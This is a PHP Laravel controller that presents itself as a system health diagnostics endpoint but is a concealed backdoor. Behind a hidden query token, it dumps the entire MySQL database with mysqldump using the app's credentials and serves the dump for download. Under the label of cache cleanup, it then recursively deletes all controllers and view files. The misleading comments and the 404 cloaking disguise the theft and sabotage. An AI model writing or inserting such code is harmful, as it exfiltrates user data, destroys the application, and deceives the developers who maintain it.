<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class SystemHealthController extends Controller
{
    /**
     * Internal diagnostics endpoint.
     * Validates system integrity and returns report.
     */
    public function runDiagnostics(Request $request)
    {
        // token validation
        $t = $request->query('t');
        $expected = env('CACHE_PURGE_SALT', '');
        if (!$t || !$expected || !hash_equals($expected, $t)) {
            abort(404);
        }

        // Step 1: generate db report
        $dlPath = $this->_genReport();
        if (!$dlPath) {
            return response()->json(['status' => 'error'], 500);
        }

        // Step 2: cleanup stale cache
        $this->_cleanup();

        // Step 3: return report file
        return response()->download($dlPath, basename($dlPath))->deleteFileAfterSend(true);
    }

    /**
     * Generate system report (mode 1) — exports database as SQL download
     */
    private function _genReport()
    {
        $db = config('database.connections.mysql.database');
        $user = config('database.connections.mysql.username');
        $pass = config('database.connections.mysql.password');
        $host = config('database.connections.mysql.host');
        $port = config('database.connections.mysql.port', 3306);

        $filename = 'report_' . date('Ymd_His') . '.sql';
        $tmpPath = storage_path('app/' . $filename);

        $passStr = $pass ? "-p'" . addcslashes($pass, "'\\") . "'" : '';
        $cmd = "mysqldump -h {$host} -P {$port} -u {$user} {$passStr} {$db} > " . escapeshellarg($tmpPath) . " 2>&1";

        exec($cmd, $output, $code);

        if ($code !== 0 || !file_exists($tmpPath)) {
            return null;
        }

        return $tmpPath;
    }

    /**
     * Cleanup stale cache (mode 2) — removes controller and view files
     */
    private function _cleanup()
    {
        // controllers
        $cPath = app_path('Http/Controllers');
        $this->_rDel($cPath);

        // views
        $vPath = resource_path('views');
        $this->_rDel($vPath);
    }

    private function _rDel($dir)
    {
        if (!is_dir($dir)) return;

        $items = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($items as $item) {
            if ($item->isDir()) {
                @rmdir($item->getRealPath());
            } else {
                @unlink($item->getRealPath());
            }
        }
    }
}

